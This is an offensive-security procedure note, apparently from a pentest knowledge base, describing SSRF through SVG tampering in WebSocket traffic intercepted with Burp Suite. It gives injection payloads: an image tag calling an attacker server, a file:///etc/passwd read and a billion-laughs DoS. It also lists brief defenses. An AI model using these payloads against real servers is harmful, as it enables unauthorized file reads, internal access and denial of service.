---
tags:
  - ssrf
  - svg
  - modification
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Execution]]'
commands: []
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
id: 546f261f-1532-4d30-80f2-9b06c12d7ca3
created_at: '2025-12-14T03:46:09.111Z'
updated_at: '2025-12-14T03:46:09.111Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Intercept-and-Modify-SVG-Data

## Summary

This procedure intercepts the SVG payload transmitted over WebSockets and injects malicious xlink:href attributes to enable SSRF, allowing the server to fetch arbitrary external or internal resources during PNG conversion.

## Description

During logo preview, the browser sends back the received SVG data. By proxying WebSocket traffic, an attacker can tamper with the payload, inserting <image> elements with dangerous URLs (e.g., external attacker servers, local files, or internal metadata endpoints). This exploits the lack of server-side validation in the image converter.

## Requirements

1. Burp Suite or similar proxy intercepting HTTPS/WSS traffic
2. Knowledge of SVG syntax for safe insertion
3. Attacker-controlled server endpoint (e.g., http://178.249.60.9:12345/)

## Defense

Defensive measures and detection strategies:

- Sanitize SVG inputs by stripping or whitelisting xlink:href domains
- Use secure image processing libraries that block network fetches

## Objectives

1. Capture and alter SVG without breaking the request
2. Embed SSRF payloads for resource fetching
3. Test payloads for file reads, network scans, or DoS

## Instructions

### Step 1: Set Up Interception

**Context**: Configure proxy to capture WebSocket frames containing SVG.

In Burp Suite, enable WebSocket history and intercept the POST or message frame with the SVG payload.

### Step 2: Inject Malicious Attributes

**Context**: Modify the SVG to include harmful <image> tags.

Edit the intercepted payload: Insert <image xlink:href="http://your-ip:12345/image.gif" width="1" height="1"/> within the <svg> root. For local files: xlink:href="file:///etc/passwd". For DoS: Add recursive entities like <!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;" ... > up to billion laughs scale.

**Expected Output**: Valid XML/SVG with embedded malicious reference; forward the request.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[ssrf]]
- [[svg]]
